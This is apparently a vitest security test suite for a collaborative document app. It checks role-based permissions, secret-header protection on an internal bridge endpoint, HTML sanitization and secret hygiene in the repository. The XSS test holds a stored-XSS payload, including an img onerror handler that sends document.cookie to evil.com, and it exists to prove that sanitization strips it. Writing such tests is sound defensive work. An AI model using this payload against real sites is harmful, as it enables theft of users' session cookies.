import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { prisma } from "../lib/db/prisma";
import {
  createDocument,
  getDocumentById,
  updateDocument,
  deleteDocument,
  addDocumentCollaborator,
  removeDocumentCollaborator,
  restoreDocumentVersion,
  getUserDocumentAccess,
} from "../lib/db/documents";
import { sanitizeHtml } from "../lib/security/sanitize";
import { server } from "../server/socket";
import fs from "fs";
import path from "path";

describe("Day 5 Task 5 — Comprehensive Security, RBAC & Hardening Suite", () => {
  let port: number;

  const ownerUser = { id: "d5_sec_owner", name: "Sec Owner", email: "owner_sec@test.com" };
  const editorUser = { id: "d5_sec_editor", name: "Sec Editor", email: "editor_sec@test.com" };
  const viewerUser = { id: "d5_sec_viewer", name: "Sec Viewer", email: "viewer_sec@test.com" };
  const strangerUser = { id: "d5_sec_stranger", name: "Sec Stranger", email: "stranger_sec@test.com" };

  let documentId: string;
  const bridgeSecret = "super_secret_audit_bridge_key_2026";

  beforeAll(async () => {
    process.env.INTERNAL_BRIDGE_SECRET = bridgeSecret;

    // Seed users
    for (const u of [ownerUser, editorUser, viewerUser, strangerUser]) {
      await prisma.user.upsert({
        where: { id: u.id },
        update: {},
        create: { id: u.id, email: u.email, name: u.name, password: "Password123!" },
      });
    }

    // Create document with owner, editor, viewer
    const doc = await prisma.document.create({
      data: {
        title: "Security Hardened Document",
        content: "<p>Baseline Secure Content</p>",
        version: 1,
        ownerId: ownerUser.id,
        collaborators: {
          createMany: {
            data: [
              { userId: editorUser.id, role: "editor" },
              { userId: viewerUser.id, role: "viewer" },
            ],
          },
        },
      },
    });
    documentId = doc.id;

    // Start Socket HTTP server to test internal bridge authorization
    await new Promise<void>((resolve) => {
      server.listen(0, () => {
        const addr = server.address();
        port = typeof addr === "object" && addr ? addr.port : 4002;
        resolve();
      });
    });
  }, 30000);

  afterAll(async () => {
    await new Promise<void>((resolve) => {
      server.close(() => resolve());
    });

    try {
      if (documentId) {
        await prisma.documentVersion.deleteMany({ where: { documentId } });
        await prisma.documentCollaborator.deleteMany({ where: { documentId } });
        await prisma.document.delete({ where: { id: documentId } });
      }
      await prisma.user.deleteMany({
        where: { id: { in: [ownerUser.id, editorUser.id, viewerUser.id, strangerUser.id] } },
      });
    } catch (e) {
      console.warn("Security cleanup warning:", e);
    }
  }, 30000);

  it("strictly enforces RBAC permissions across all document operations", async () => {
    // 1. Verify access roles
    expect(await getUserDocumentAccess(ownerUser.id, documentId)).toBe("owner");
    expect(await getUserDocumentAccess(editorUser.id, documentId)).toBe("editor");
    expect(await getUserDocumentAccess(viewerUser.id, documentId)).toBe("viewer");
    expect(await getUserDocumentAccess(strangerUser.id, documentId)).toBe("none");

    // 2. Viewer cannot edit document (must return 403)
    const viewerEditRes = await updateDocument(documentId, viewerUser.id, {
      title: "Hacked by Viewer",
      content: "<p>Viewer attempting write</p>",
    });
    expect(viewerEditRes.success).toBe(false);
    if (!viewerEditRes.success) {
      expect(viewerEditRes.status).toBe(403);
      expect(viewerEditRes.error).toContain("Forbidden");
    }

    // 3. Stranger cannot edit document (must return 403)
    const strangerEditRes = await updateDocument(documentId, strangerUser.id, {
      title: "Hacked by Stranger",
    });
    expect(strangerEditRes.success).toBe(false);
    if (!strangerEditRes.success) {
      expect(strangerEditRes.status).toBe(403);
    }

    // 4. Editor cannot delete document (must return 403)
    const editorDeleteRes = await deleteDocument(documentId, editorUser.id);
    expect(editorDeleteRes.success).toBe(false);
    if (!editorDeleteRes.success) {
      expect(editorDeleteRes.status).toBe(403);
      expect(editorDeleteRes.error).toContain("Forbidden");
    }

    // 5. Viewer cannot delete document (must return 403)
    const viewerDeleteRes = await deleteDocument(documentId, viewerUser.id);
    expect(viewerDeleteRes.success).toBe(false);
    if (!viewerDeleteRes.success) {
      expect(viewerDeleteRes.status).toBe(403);
    }

    // 6. Editor cannot add/manage collaborators (must return 403)
    const editorAddCollabRes = await addDocumentCollaborator(
      documentId,
      strangerUser.email,
      "viewer",
      editorUser.id
    );
    expect(editorAddCollabRes.success).toBe(false);
    if (!editorAddCollabRes.success) {
      expect(editorAddCollabRes.status).toBe(403);
      expect(editorAddCollabRes.error).toContain("Only the document owner can manage collaborators");
    }

    // 7. Viewer cannot restore version (must return 403)
    const viewerRestoreRes = await restoreDocumentVersion(documentId, 1, viewerUser.id);
    expect(viewerRestoreRes.success).toBe(false);
    if (!viewerRestoreRes.success) {
      expect(viewerRestoreRes.status).toBe(403);
      expect(viewerRestoreRes.error).toContain("Forbidden");
    }
  });

  it("protects internal HTTP bridge endpoints with secret validation", async () => {
    // 1. Request with NO secret header -> 401 Unauthorized
    const noHeaderRes = await fetch(`http://localhost:${port}/api/socket/document-restored`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ documentId, version: 1, restoredFromVersion: 1, title: "T", content: "C" }),
    });
    expect(noHeaderRes.status).toBe(401);
    const noHeaderData = await noHeaderRes.json();
    expect(noHeaderData.error).toContain("Invalid or missing internal bridge secret");

    // 2. Request with WRONG secret header -> 401 Unauthorized
    const wrongHeaderRes = await fetch(`http://localhost:${port}/api/socket/document-restored`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-internal-bridge-secret": "wrong_attack_token",
      },
      body: JSON.stringify({ documentId, version: 1, restoredFromVersion: 1, title: "T", content: "C" }),
    });
    expect(wrongHeaderRes.status).toBe(401);

    // 3. Request with VALID secret header -> 200 OK
    const validHeaderRes = await fetch(`http://localhost:${port}/api/socket/document-restored`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-internal-bridge-secret": bridgeSecret,
      },
      body: JSON.stringify({ documentId, version: 1, restoredFromVersion: 1, title: "T", content: "C" }),
    });
    expect(validHeaderRes.status).toBe(200);
    const validData = await validHeaderRes.json();
    expect(validData.success).toBe(true);
  });

  it("verifies HTML sanitization blocks stored XSS vectors during document creation and updates", async () => {
    // 1. Raw XSS attack string
    const maliciousPayload = `
      <p>Clean paragraph</p>
      <script>alert("hacked")</script>
      <img src=x onerror="fetch('http://evil.com?c='+document.cookie)" />
      <a href="javascript:alert(1)">Click me</a>
      <svg onload="alert(document.domain)"></svg>
    `;

    // 2. Direct unit assertion on sanitizeHtml
    const sanitized = sanitizeHtml(maliciousPayload);
    expect(sanitized).not.toContain("<script");
    expect(sanitized).not.toContain("onerror");
    expect(sanitized).not.toContain("javascript:");
    expect(sanitized).not.toContain("onload");
    expect(sanitized).toContain("<p>Clean paragraph</p>");

    // 3. Persist update via updateDocument and verify DB content is sanitized on-write
    const updateRes = await updateDocument(documentId, ownerUser.id, {
      content: maliciousPayload,
    });
    expect(updateRes.success).toBe(true);
    if (updateRes.success) {
      expect(updateRes.data.content).not.toContain("<script");
      expect(updateRes.data.content).not.toContain("onerror");
      expect(updateRes.data.content).not.toContain("javascript:");
      expect(updateRes.data.content).not.toContain("onload");
      expect(updateRes.data.content).toContain("<p>Clean paragraph</p>");
    }

    // 4. Verify directly in database
    const dbDoc = await prisma.document.findUnique({ where: { id: documentId } });
    expect(dbDoc?.content).not.toContain("<script");
    expect(dbDoc?.content).not.toContain("onerror");
  });

  it("validates git hygiene and environment secrets safety", () => {
    const gitignorePath = path.resolve(__dirname, "../.gitignore");
    expect(fs.existsSync(gitignorePath)).toBe(true);
    const gitignoreContent = fs.readFileSync(gitignorePath, "utf-8");

    // .env must be ignored
    expect(gitignoreContent).toMatch(/\.env\*/);
    // .env.example must NOT be ignored
    expect(gitignoreContent).toContain("!.env.example");

    // Check .env.example contains NO real production secrets
    const envExamplePath = path.resolve(__dirname, "../.env.example");
    const envExampleContent = fs.readFileSync(envExamplePath, "utf-8");
    expect(envExampleContent).toContain('AUTH_SECRET=""');
    expect(envExampleContent).toContain('INTERNAL_BRIDGE_SECRET=""');
    expect(envExampleContent).not.toMatch(/AUTH_SECRET="[a-zA-Z0-9+/=]{32,}"/);
  });
});
